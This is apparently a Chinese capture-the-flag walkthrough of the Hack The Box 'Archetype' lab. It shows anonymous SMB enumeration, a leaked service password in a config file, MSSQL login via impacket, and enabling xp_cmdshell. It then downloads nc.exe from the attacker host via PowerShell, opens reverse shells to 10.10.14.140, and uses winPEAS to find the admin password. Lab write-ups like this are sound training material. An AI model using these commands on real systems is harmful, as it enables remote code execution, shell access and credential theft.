**任务2 ：SMB上可用的非管理共享名称是什么？**

![](../Images/898d7d488164628de343f8b32d9c2a74.png)

`` `smbclient -L \\10.129.151.127` ``密码直接空密码，回车即可

![](../Images/2a295116e61feddc23ed90c9fe6f1677.png)

可以看到这里共享了四个目录，非管理共享目录的话就是backups了

所以任务2的答案是backups

  

**任务3：SMB共享文件中标识的密码是什么？**

 

![](../Images/a6f2ea8d6f69d4822aafa17d31c5b486.png)

我们进行连接backups目录`` `smbclient \\\\10.129.151.127\\backups` ``

然后使用get这个文件下载下来`` `get prod.dtsConfig` ``

再到本地使用cat查看，里面有个Passwordi字段，那就是这个密码了

![](../Images/dd4ccb6f1720af498d2cc9c2163662ce.png)

所以任务3答案是M3g4c0rp123

  

**任务4：可以使用 impacket 中的哪些脚本来建立到 Microsoft SQL Server 的经过身份验证的连接？**

 

![](../Images/d35b8b70886be2bc6c81adbd4aa3b609.png)

这里考察的我们对impacket框架的了解，在impacket中哪个脚本可以连接SQL Server

Gitub.com搜索impacket第一个就是

![](../Images/854123bf5b5bc301616f384cd750cebc.png)

使用git拉取`` `> git clone https://github.com/SecureAuthCorp/impacket.git   > cd impacket   > sudo python3 setup.py install   > pip3 install -r requirements.txt` ``

安装好依赖之后就可以使用了  

![](../Images/34effa7fc4e34d873d0764daaac59a14.png)

impacket的脚本都在examples里面，看名字就知道mssql开头的就是

![](../Images/5ebe6d042dc8ee11568ed519cc4a4944.png)

我们这里看一下mssqlclient.py脚本的帮助信息，那就是这个脚本了

所以任务4的答案就是mssqlclient.py

**任务7：哪个文件包含管理员的密码？**

这里就需要我们通过之前xp\_cmdshell拿到这台机器的shell

我们使用impacket框架中的mssqlclient.py脚本进行身份验证

lid为ARCHETYPE/sql\_svc

l@后面接IP地址

l密码为M3g4c0rp123

这些信息都是我们从smb中的prod.dtsConfig文件中得到的

![](../Images/601af8841dfd9d068dced5dc482a3945.png)

连接进mssql之后就使用xp\_cmdshell进行拿shell`` `SQL> EXEC xp_cmdshell 'whoami'` ``可以看到xp\_cmdshell没有激活

![](../Images/78d0f18400cb688ce23f20c7576f76db.png)

`` `SQL> SELECT is_srvrolemember('sysadmin');` ``

 

![](../Images/325e86e8c79ba368c68ed95181573343.png)

返回为1就代表着对于的权限，我们这里为sysadmin权限，可以使用xp\_cmdshell拿shell

sp\_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回0，失败返回1”`` `SQL> EXECUTE sp_configure 'show advanced options',1;   SQL> RECONFIGURE;//使前面的配置生效   SQL> EXECUTE sp_configure 'xp_cmdshell',1;//开启CMDshell   SQL> RECONFIGURE;//使前面的配置生效` ``

执行完这些语句之后我们就可以执行我们的xp\_cmdshell`` `SQL> xp_cmdshell "whoami"` ``

![](../Images/05ee7d6ea981be6cd835f411de1b0f34.png)

当前用户为一个数据库用户，然后使用nc将会话弹回来，方便后面的提权操作，现在桌面使用python起一个http服务

![](../Images/c49444f3d0d766aa9321d26b94c62958.png)

再利用xp\_cmdshell调用powershell将nc下载到目标机器上`` `SQL> xp_cmdshell "powershell.exe wget http://10.10.14.140/nc.exe -O c:\\Users\Public\\nc.exe` ``

![](../Images/8b30026dfb0410039f35b960154d2cd8.png)

看到这边有个get请求之后就是下载成功了，本机使用nc进行监听，目标机器使用nc将cmd反弹到我们机器上`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.140 4444"` ``

![](../Images/a450f4b7e7dcf1e193d2cbb5dba45087.png)

因为我这里使用的是新版的Netcat，没有\-e参数了

![](../Images/ca3f91fffdc6b54e877b04c848fee681.png)

这里使用nc串联的方式来弹回shell`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe 10.10.14.140 4444 | cmd.exe | c:\\Users\Public\\nc.exe 10.10.14.140 3333"` ``

l在4444端口输入命令，会通过管道符，传输到cmd 解析结果通过管道通过nc传输到3333端口

![](../Images/8d21e17b63a895d90a34de2251a4d6b0.png)

我们在4444端口输入命令会通过管道符传输到cmd.exe，结果通过nc传输到10.10.14.140 3333端口

![](../Images/2b243c0c9b3692c87cbdf64d5a911478.png)

![](../Images/146305b38316c3f3fe6175b61f45ad8c.png)

我们这里找到一个user.txt，但是任务7是让我们寻找包含管理员的密码，我们使用winPEAS进行提权

https://github.com/carlospolop/PEASS-ng/releases/tag/20220710

在这个里面下载我们对于系统的程序

![](../Images/088dc1cdbf01157203ee976ec574cc2e.png)

这里我下载的是winPEAS.bat批处理脚本，因为exe程序的输出东西太多了，Kali终端最上面有一些东西看不到，还是通过上传nc一样的方式进行上传winPEAS.bat(但是这里需要断开nc会话，否则下载不了)

![](../Images/1785b368a817b76ae3814691794c3302.png)

成功下载之后我们再连接上nc`` `SQL> xp_cmdshell "c:\\Users\Public\\nc.exe 10.10.14.140 4444 | cmd.exe | c:\\Users\Public\\nc.exe 10.10.14.140 3333"` ``

![](../Images/8608fd161ba34d0ff00129f7f079a44e.png)

cd到我们下载的目录

![](../Images/266457e53e1b4fd017636231f60cf98e.png)

直接.\\winPEAS.bat执行即可，他会自己执行各个功能 我们只需要等待即可

![](../Images/2a4ec5edd936842cf38ba8f2d0439fec.png)

等待片刻之后扫描到一个console history file

![](../Images/5cec23c6d9d452e2874214f3c9e58b47.png)

我们使用type查看

![](../Images/41de6313dbcbced507c91fc78bf57e2c.png)

是一个历史命令，administrator用户登录后将共享文件夹\\Archetype\\backups映射到T盘，后面是用户名的密码

那么任务7的答案就是ConsoleHost\_history.txt文件中包含管理员的密码

我们需要使用administrator登录到机器上查看administrator的桌面，这里使用impacket框架中的psexec.py脚本
